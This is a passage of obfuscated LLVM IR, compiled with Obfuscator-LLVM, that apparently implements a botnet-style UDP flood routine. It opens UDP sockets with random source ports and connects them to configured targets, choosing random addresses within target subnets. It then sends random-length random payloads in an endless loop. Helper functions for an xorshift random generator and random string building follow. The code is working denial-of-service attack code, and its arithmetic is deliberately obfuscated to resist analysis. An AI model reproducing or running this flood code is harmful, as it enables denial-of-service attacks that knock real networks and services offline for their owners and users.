  %36 = load i8, i8* %35, align 8
  %37 = call i32 @rand() #8
  %38 = srem i32 %37, 65482
  %39 = sub i32 0, 53
  %40 = sub i32 0, %38
  %41 = add i32 %39, %40
  %42 = sub i32 0, %41
  %43 = add nsw i32 53, %38
  %44 = trunc i32 %42 to i16
  %45 = call zeroext i16 @retrieve_opt_num(%struct.option* %33, i8 zeroext %36, i8 zeroext 1, i16 zeroext %44)
  store i16 %45, i16* %4, align 2
  %46 = call i32 @socket(i32 2, i32 2, i32 0) #8
  %47 = load i32*, i32** %7, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i32, i32* %47, i64 %49
  store i32 %46, i32* %50, align 4
  %51 = load i32*, i32** %7, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i32, i32* %51, i64 %53
  %55 = load i32, i32* %54, align 4
  %56 = icmp eq i32 %55, -1
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %30
  call void @exit(i32 1) #10
  unreachable

; <label>:58:                                     ; preds = %30
  %59 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %59, align 4
  %60 = call i32 @rand_new()
  %61 = trunc i32 %60 to i16
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %61, i16* %62, align 2
  %63 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %64 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %63, i32 0, i32 0
  store i32 0, i32* %64, align 4
  %65 = load i32*, i32** %7, align 8
  %66 = load i32, i32* %5, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i32, i32* %65, i64 %67
  %69 = load i32, i32* %68, align 4
  %70 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %71 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  store %struct.sockaddr* %71, %struct.sockaddr** %70, align 8
  %72 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %73 = load %struct.sockaddr*, %struct.sockaddr** %72, align 8
  %74 = call i32 @bind(i32 %69, %struct.sockaddr* %73, i32 16) #8
  %75 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %75, align 4
  %76 = load i16, i16* %4, align 2
  %77 = call zeroext i16 @htons(i16 zeroext %76) #9
  %78 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %77, i16* %78, align 2
  %79 = load %struct.arguments*, %struct.arguments** %2, align 8
  %80 = getelementptr inbounds %struct.arguments, %struct.arguments* %79, i32 0, i32 0
  %81 = load %struct.target*, %struct.target** %80, align 8
  %82 = load i32, i32* %5, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds %struct.target, %struct.target* %81, i64 %83
  %85 = getelementptr inbounds %struct.target, %struct.target* %84, i32 0, i32 1
  %86 = load i16, i16* %85, align 4
  %87 = zext i16 %86 to i32
  %88 = icmp slt i32 %87, 32
  br i1 %88, label %89, label %115

; <label>:89:                                     ; preds = %58
  %90 = load %struct.arguments*, %struct.arguments** %2, align 8
  %91 = getelementptr inbounds %struct.arguments, %struct.arguments* %90, i32 0, i32 0
  %92 = load %struct.target*, %struct.target** %91, align 8
  %93 = load i32, i32* %5, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.target, %struct.target* %92, i64 %94
  %96 = getelementptr inbounds %struct.target, %struct.target* %95, i32 0, i32 0
  %97 = load i32, i32* %96, align 4
  %98 = call i32 @ntohl(i32 %97) #9
  %99 = call i32 @rand_new()
  %100 = load %struct.arguments*, %struct.arguments** %2, align 8
  %101 = getelementptr inbounds %struct.arguments, %struct.arguments* %100, i32 0, i32 0
  %102 = load %struct.target*, %struct.target** %101, align 8
  %103 = load i32, i32* %5, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds %struct.target, %struct.target* %102, i64 %104
  %106 = getelementptr inbounds %struct.target, %struct.target* %105, i32 0, i32 1
  %107 = load i16, i16* %106, align 4
  %108 = zext i16 %107 to i32
  %109 = lshr i32 %99, %108
  %110 = sub i32 %98, 69962729
  %111 = add i32 %110, %109
  %112 = add i32 %111, 69962729
  %113 = add i32 %98, %109
  %114 = call i32 @htonl(i32 %112) #9
  br label %124

; <label>:115:                                    ; preds = %58
  %116 = load %struct.arguments*, %struct.arguments** %2, align 8
  %117 = getelementptr inbounds %struct.arguments, %struct.arguments* %116, i32 0, i32 0
  %118 = load %struct.target*, %struct.target** %117, align 8
  %119 = load i32, i32* %5, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds %struct.target, %struct.target* %118, i64 %120
  %122 = getelementptr inbounds %struct.target, %struct.target* %121, i32 0, i32 0
  %123 = load i32, i32* %122, align 4
  br label %124

; <label>:124:                                    ; preds = %115, %89
  %125 = phi i32 [ %114, %89 ], [ %123, %115 ]
  %126 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %127 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %126, i32 0, i32 0
  store i32 %125, i32* %127, align 4
  %128 = load i32*, i32** %7, align 8
  %129 = load i32, i32* %5, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i32, i32* %128, i64 %130
  %132 = load i32, i32* %131, align 4
  %133 = bitcast %union.__CONST_SOCKADDR_ARG* %11 to %struct.sockaddr**
  %134 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %134, %struct.sockaddr** %133, align 8
  %135 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %11, i32 0, i32 0
  %136 = load %struct.sockaddr*, %struct.sockaddr** %135, align 8
  %137 = call i32 @connect(i32 %132, %struct.sockaddr* %136, i32 16)
  br label %138

; <label>:138:                                    ; preds = %124
  %139 = load i32, i32* %5, align 4
  %140 = add i32 %139, 1469751513
  %141 = add i32 %140, 1
  %142 = sub i32 %141, 1469751513
  %143 = add nsw i32 %139, 1
  store i32 %142, i32* %5, align 4
  br label %23

; <label>:144:                                    ; preds = %23
  store i32 0, i32* %12, align 4
  br label %145

; <label>:145:                                    ; preds = %205, %144
  store i32 0, i32* %5, align 4
  br label %146

; <label>:146:                                    ; preds = %200, %145
  %147 = load i32, i32* %5, align 4
  %148 = load %struct.arguments*, %struct.arguments** %2, align 8
  %149 = getelementptr inbounds %struct.arguments, %struct.arguments* %148, i32 0, i32 3
  %150 = load i8, i8* %149, align 1
  %151 = zext i8 %150 to i32
  %152 = icmp slt i32 %147, %151
  br i1 %152, label %153, label %205

; <label>:153:                                    ; preds = %146
  %154 = call i32 @rand() #8
  %155 = srem i32 %154, 436
  %156 = sub i32 0, %155
  %157 = sub i32 1024, %156
  %158 = add nsw i32 1024, %155
  %159 = trunc i32 %157 to i16
  store i16 %159, i16* %3, align 2
  %160 = load i16, i16* %3, align 2
  %161 = zext i16 %160 to i64
  %162 = call noalias i8* @malloc(i64 %161) #8
  store i8* %162, i8** %6, align 8
  store i32 0, i32* %12, align 4
  br label %163

; <label>:163:                                    ; preds = %183, %153
  %164 = load i32, i32* %12, align 4
  %165 = load i16, i16* %3, align 2
  %166 = zext i16 %165 to i32
  %167 = icmp slt i32 %164, %166
  br i1 %167, label %168, label %190

; <label>:168:                                    ; preds = %163
  %169 = call i32 @rand() #8
  %170 = xor i32 %169, -1
  %171 = xor i32 65535, -1
  %172 = xor i32 -1901299292, -1
  %173 = or i32 %170, %171
  %174 = or i32 -1901299292, %172
  %175 = xor i32 %173, -1
  %176 = and i32 %175, %174
  %177 = and i32 %169, 65535
  %178 = trunc i32 %176 to i8
  %179 = load i8*, i8** %6, align 8
  %180 = load i32, i32* %12, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds i8, i8* %179, i64 %181
  store i8 %178, i8* %182, align 1
  br label %183

; <label>:183:                                    ; preds = %168
  %184 = load i32, i32* %12, align 4
  %185 = sub i32 0, %184
  %186 = sub i32 0, 1
  %187 = add i32 %185, %186
  %188 = sub i32 0, %187
  %189 = add nsw i32 %184, 1
  store i32 %188, i32* %12, align 4
  br label %163

; <label>:190:                                    ; preds = %163
  %191 = load i32*, i32** %7, align 8
  %192 = load i32, i32* %5, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds i32, i32* %191, i64 %193
  %195 = load i32, i32* %194, align 4
  %196 = load i8*, i8** %6, align 8
  %197 = load i16, i16* %3, align 2
  %198 = zext i16 %197 to i64
  %199 = call i64 @send(i32 %195, i8* %196, i64 %198, i32 16384)
  br label %200

; <label>:200:                                    ; preds = %190
  %201 = load i32, i32* %5, align 4
  %202 = sub i32 0, 1
  %203 = sub i32 %201, %202
  %204 = add nsw i32 %201, 1
  store i32 %203, i32* %5, align 4
  br label %146

; <label>:205:                                    ; preds = %146
  br label %145
                                                  ; No predecessors!
  ret void
}

; Function Attrs: nounwind
declare i32 @rand() #2

; Function Attrs: noinline nounwind uwtable
define i32 @rand_new() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @t, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 15
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, -1
  %7 = and i32 -1251977665, %6
  %8 = xor i32 -1251977665, -1
  %9 = and i32 %5, %8
  %10 = xor i32 %4, -1
  %11 = and i32 %10, -1251977665
  %12 = and i32 %4, %8
  %13 = or i32 %7, %9
  %14 = or i32 %11, %12
  %15 = xor i32 %13, %14
  %16 = xor i32 %5, %4
  store i32 %15, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = lshr i32 %17, 9
  %19 = load i32, i32* %1, align 4
  %20 = xor i32 %19, -1
  %21 = and i32 %18, %20
  %22 = xor i32 %18, -1
  %23 = and i32 %19, %22
  %24 = or i32 %21, %23
  %25 = xor i32 %19, %18
  store i32 %24, i32* %1, align 4
  %26 = load i32, i32* @p, align 4
  store i32 %26, i32* @t, align 4
  %27 = load i32, i32* @c, align 4
  store i32 %27, i32* @p, align 4
  %28 = load i32, i32* @f, align 4
  store i32 %28, i32* @c, align 4
  %29 = load i32, i32* @f, align 4
  %30 = lshr i32 %29, 13
  %31 = load i32, i32* @f, align 4
  %32 = xor i32 %31, -1
  %33 = and i32 %30, %32
  %34 = xor i32 %30, -1
  %35 = and i32 %31, %34
  %36 = or i32 %33, %35
  %37 = xor i32 %31, %30
  store i32 %36, i32* @f, align 4
  %38 = load i32, i32* %1, align 4
  %39 = load i32, i32* @f, align 4
  %40 = xor i32 %39, -1
  %41 = and i32 %38, %40
  %42 = xor i32 %38, -1
  %43 = and i32 %39, %42
  %44 = or i32 %41, %43
  %45 = xor i32 %39, %38
  store i32 %44, i32* @f, align 4
  %46 = load i32, i32* @f, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind uwtable
define void @rand_string(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i8 0, i8* %7, align 1
  store i32 0, i32* %5, align 4
  br label %8

; <label>:8:                                      ; preds = %34, %2
  %9 = load i32, i32* %5, align 4
  %10 = load i32, i32* %4, align 4
  %11 = icmp slt i32 %9, %10
  br i1 %11, label %12, label %39

; <label>:12:                                     ; preds = %8
  %13 = call i32 @rand_new()
  store i32 %13, i32* %6, align 4
  %14 = load i32, i32* %6, align 4
  %15 = xor i32 %14, -1
  %16 = xor i32 255, -1
  %17 = xor i32 747923501, -1
  %18 = or i32 %15, %16
  %19 = or i32 747923501, %17
  %20 = xor i32 %18, -1
  %21 = and i32 %20, %19
  %22 = and i32 %14, 255
  %23 = trunc i32 %21 to i8
  store i8 %23, i8* %7, align 1
  %24 = load i8, i8* %7, align 1
  %25 = zext i8 %24 to i32
  %26 = ashr i32 %25, 3
  %27 = trunc i32 %26 to i8
  store i8 %27, i8* %7, align 1
  %28 = load i8, i8* %7, align 1
  %29 = zext i8 %28 to i64
  %30 = getelementptr inbounds [36 x i8], [36 x i8]* @alpha_set, i64 0, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = load i8*, i8** %3, align 8
  %33 = getelementptr inbounds i8, i8* %32, i32 1
  store i8* %33, i8** %3, align 8
  store i8 %31, i8* %32, align 1
  br label %34

; <label>:34:                                     ; preds = %12
  %35 = load i32, i32* %5, align 4
  %36 = sub i32 0, 1
  %37 = sub i32 %35, %36
  %38 = add nsw i32 %35, 1
  store i32 %37, i32* %5, align 4
  br label %8

; <label>:39:                                     ; preds = %8
  ret void
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind readonly }
attributes #8 = { nounwind }
attributes #9 = { nounwind readnone }
attributes #10 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
